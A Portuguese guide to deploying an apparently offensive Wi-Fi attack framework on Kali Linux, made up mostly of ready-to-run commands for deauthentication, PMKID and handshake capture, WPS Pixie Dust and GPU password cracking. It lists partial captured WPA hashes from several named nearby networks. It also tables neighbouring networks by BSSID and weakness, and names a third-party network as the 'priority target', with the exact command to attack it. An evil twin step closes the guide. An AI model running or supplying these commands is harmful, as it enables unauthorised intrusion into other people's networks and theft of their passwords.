# WirelessXPL-Forge — Guia de Deploy em Kali Linux Nativo

**Versão:** 1.2.0  
**Data:** 2026-05-03  
**Contexto:** Deploy em máquina Kali Linux real (não virtualizada) com RT5370  

---

## Por que Kali Linux Nativo é Superior

O ambiente WSL2 via usbipd tem limitações sérias para wireless:

| Limitação | WSL2 | Kali Nativo |
|---|---|---|
| Packet injection | ~36% | ~98%+ |
| Monitor mode | Funciona | Funciona |
| Driver rt2800usb | Precisa kernel custom | Nativo |
| Deauth efetivo | Limitado (PMF) | Muito mais efetivo |
| Handshake capture | Difícil | Fácil |
| GPU hashcat | Funciona (CUDA) | Funciona (CUDA) |
| Estabilidade USB | Overhead usbipd | Direto |

---

## 1. Instalação Rápida

```bash
# Clonar o repositório
git clone https://github.com/mrhenrike/WirelessXPL-Forge.git
cd WirelessXPL-Forge

# Instalar dependências
pip install -r requirements.txt
sudo apt install -y aircrack-ng hcxdumptool hcxtools reaver bully \
    mdk4 iw wireless-tools hashcat wordlists

# Descompactar rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true

# Instalar wordlists extras
git clone https://github.com/mrhenrike/WordListsForHacking /opt/WordListsForHacking
```

---

## 2. Setup do Adapter RT5370

```bash
# Verificar detecção
lsusb | grep 148f  # deve aparecer 148f:5370

# Carregar driver (já incluído no kernel Kali)
sudo modprobe rt2800usb

# Verificar interface
iw dev  # deve aparecer wlan0 ou wlxXXXXXXXXXXXX

# Configurar monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0  # cria wlan0mon
```

---

## 3. Executar WirelessXPL-Forge

```bash
cd WirelessXPL-Forge

# Modo interativo (como Metasploit)
sudo python3 wxf.py

# Modo não-interativo
sudo python3 wxf.py -m generic/wifi_lab/handshake_snooper \
    -s "interface wlan0mon" \
    -s "target_bssid AA:BB:CC:DD:EE:FF" \
    -s "target_channel 6" \
    -s "deauth_count 10" \
    -s "capture_timeout 60"
```

---

## 4. Campanha Completa (Script)

```bash
# Setup de variáveis
IFACE=wlan0mon
OWN_BSSID="72:4E:6B:1A:CB:90"   # UNIAOGEEK 2.4GHz
OWN_CH=1

# 1. Scan de APs
sudo python3 wxf.py -m generic/wifi_lab/wifi_security_analyzer \
    -s "interface $IFACE" -s "scan_time 60"

# 2. PMKID capture (hcxdumptool bridge — já corrigido para v6.3)
sudo python3 wxf.py -m generic/external/hcxdumptool_live_bridge \
    -s "interface $IFACE" -s "duration 120" \
    -s "output_file /tmp/pmkid.pcapng" -s "i_know_scope true"

# 3. Handshake + deauth (v2.0 — com scan de clientes + captura simultânea)
sudo python3 wxf.py -m generic/wifi_lab/deauth_multimode \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "mode broadcast" \
    -s "backend mdk4" \
    -s "duration 60" \
    -s "capture_handshake true"

# 4. WPS AUTO (pixie_dust → null_pin → pin_wordlist — v2.0)
sudo python3 wxf.py -m generic/wifi_lab/wps_multimode \
    -s "target_bssid $OWN_BSSID" \
    -s "interface $IFACE" \
    -s "target_channel $OWN_CH" \
    -s "mode auto" \
    -s "timeout 300" \
    -s "pin_delay 2" \
    -s "output_dir /tmp/wxf_wps"

# 5. Crack GPU (após captura)
hcxpcapngtool /tmp/pmkid.pcapng -o /tmp/hashes.txt
hashcat -m 22000 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 5. Hashes Capturados (prontos para crack)

Arquivo salvo em: `resources/captured_hashes.txt`

```
# UNIAOGEEK — EAPOL handshake completo (WPA*02)
WPA*02*1e949295a285576cb2fd23f98e71ec1e*724e6b1acb90*...

# Denise 2 — PMKID
WPA*01*d06e6e11988009fb7f15374d001a9ba0*78321b6546e4*...

# Denise — PMKID  
WPA*01*5a402b2e419317e119b540824af9964d*e820e2060f4b*...

# NET_2G060F46-IoT — PMKID
WPA*01*495ac3e4919f6d54ac9a77630154d5d2*ea20e206104e*...
```

```bash
# Crack com GPU RTX (qualquer GPU NVIDIA)
hashcat -m 22000 resources/captured_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    /opt/WordListsForHacking/passwords/wlist_brasil.lst \
    /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Brute force numérico BR (8-11 dígitos)
for D in 8 9 10 11; do
    hashcat -m 22000 resources/captured_hashes.txt -a 3 $(python3 -c "print('?d'*$D)")
done

# WFH Markov (treinado em wlist_brasil)
python3 /opt/WordListsForHacking/wfh.py markov train \
    --wordlist /opt/WordListsForHacking/passwords/wlist_brasil.lst \
    --model-output /tmp/markov.pkl
python3 /opt/WordListsForHacking/wfh.py markov generate \
    --model /tmp/markov.pkl --min-len 8 --max-len 20 \
    --limit 2000000 -o /tmp/markov_cands.txt
hashcat -m 22000 resources/captured_hashes.txt /tmp/markov_cands.txt
```

---

## 6. Redes Detectadas (Scan 2026-05-03)

### Redes Abertas (#CLARO-WIFI)
| BSSID | Canal | Sinal | Status |
|---|---|---|---|
| `EA:20:E2:06:10:4C` | 1 | -64 dBm | **Conectado (captive portal)** |
| `6E:11:BA:2C:45:63` | 9 | -66 dBm | Aberta |
| `96:2C:B3:93:39:D7` | 11 | -79 dBm | Aberta |

### Vulnerabilidades Identificadas
| Rede | BSSID | Vulnerabilidade | Prioridade |
|---|---|---|---|
| `1-708` | `44:3B:32:B2:CF:81` | **WPS 1.0 — Pixie Dust** | ALTA |
| `Denise` | `E8:20:E2:06:0F:4B` | TKIP (CVE-2008-2370) | ALTA |
| `TrOll_MaStEr_BLaStEr_2Ghz` | `F0:25:8E:EA:A1:38` | TKIP + -37dBm | ALTA |
| `VOE_AP1704` | `CC:29:BD:20:18:AB` | TKIP + WPS 2.0 | MÉDIA |
| 50+ redes | Várias | WPS 2.0 sem lock | MÉDIA |

### Alvo Prioritário no Kali Nativo
```bash
# 1-708 WPS 1.0 — Pixie Dust com 5min (deve crackar)
sudo python3 wxf.py -m generic/wifi_lab/wps_multimode \
    -s "target_bssid 44:3B:32:B2:CF:81" \
    -s "interface wlan0mon" \
    -s "target_channel 7" \
    -s "mode auto" \
    -s "timeout 300" \
    -s "pin_delay 1"
```

---

## 7. O que foi Implementado/Melhorado

### Novos Módulos (v1.2.0)
| Módulo | Protocolo | Destaques |
|---|---|---|
| `zwave/zwave_attack_suite.py` | Z-Wave | CVE-2024-50920/50930, CVSS 8.8 |
| `matter/matter_thread_bridge.py` | Matter/Thread | TLV overflow, fabric impersonation |
| `v2x/v2x_dsrc_attack.py` | V2X/DSRC | BSM spoof, RSU impersonation |
| `tpms/tpms_spoof_replay.py` | TPMS 315/433MHz | Spoof pressão pneu |
| `uwb/uwb_relay_attack.py` | UWB | PKES relay, ranging manipulation |
| `dect/dect_eavesdrop_bridge.py` | DECT | Eavesdrop, clone handset |
| `nfc/nfc_relay_ndef_bridge.py` | NFC | NFCGate relay, clone Mifare |
| `bluetooth/bt_rfcomm_oob_cve2025_13834.py` | BT RFCOMM | CVE-2025-13834, CVSS 7.5 |
| `bluetooth/zigbee_replay_cve2021_27289.py` | Zigbee | CVE-2021-27289, CVSS 8.8 |
| `wifi_lab/cve_2024_30078_windows_wifi_driver.py` | WiFi/nwifi.sys | CVE-2024-30078, CVSS 8.8 |
| `wifi_lab/qualcomm_wlan_ml_ie_cve2024_45569.py` | Qualcomm WLAN | CVE-2024-45569, **CVSS 9.8** |
| `wifi_lab/airsnitch_isolation_bypass.py` | WiFi Isolation | AirSnitch NDSS'26, GTK abuse |
| `wifi_lab/wifiair_c2_beacon.py` | 802.11 VSE | C2 em beacons, AES-256-CTR |

### Módulos Melhorados (v2.0)
| Módulo | Melhorias |
|---|---|
| `wifi_lab/wps_multimode.py` | Modo auto, pin_wordlist (10M PINs válidos), hashcat_gpu, retry backends |
| `wifi_lab/deauth_multimode.py` | Scan de clientes, mdk4 primário, captura simultânea de handshake |
| `wifi_lab/handshake_snooper.py` | Fix hcxdumptool v6.3 (--enable_status → -w) |
| `wifi_lab/pmkid_autopwn.py` | Fix IndentationError, fix flag hcxdumptool v6.3 |

### Infraestrutura Core
| Arquivo | Função |
|---|---|
| `core/phase_gateway.py` | Pipeline sequencial de verificação (PhaseGateway) |
| `core/hw_validator.py` | Validação de hardware por requisito enumerado |
| `core/polyglot_orchestrator.py` | Execução de exploits em C, C++, Rust, Go, Ruby... |

---

## 8. Configuração WSL2 (para referência futura)

```ini
# C:\Users\mrhen\.wslconfig
[wsl2]
# Kernel com rt2800usb (para WSL2 como fallback)
kernel=C:\wsl2-kernels\bzImage-rt5370
```

```powershell
# Conectar RT5370 ao WSL2 (quando necessário)
.\tools\attach_rt5370_wsl.ps1
```

---

## 9. Problema VirtualBox (para referência)

**Causa raiz do abort**: USBPcap interceptava `VERR_READ_ERROR (-111)` no proxy VBox.

**Fix aplicado**:
- USBPcap desinstalado
- USB Hub UpperFilters limpo  
- RT5370 removido do usbipd forced binding
- Filtro VBox configurado (VID=148F/PID=5370)
- **Reboot necessário** para USBPcap sair da memória do kernel

---

## 10. Próximos Passos no Kali Nativo

1. **Instalar WirelessXPL-Forge**: `git clone + pip install`
2. **Conectar RT5370**: `lsusb → airmon-ng start wlan0`
3. **Scan + PMKID**: `python3 wxf.py -m generic/external/hcxdumptool_live_bridge`
4. **Deauth + Handshake**: `python3 wxf.py -m generic/wifi_lab/deauth_multimode`
5. **WPS 1-708**: `python3 wxf.py -m generic/wifi_lab/wps_multimode -s "mode auto"`
6. **Crack GPU**: `hashcat -m 22000 hashes.txt /wordlists/...`
7. **Evil Twin UNIAOGEEK**: `python3 wxf.py -m generic/wifi_lab/evil_twin_workflow`
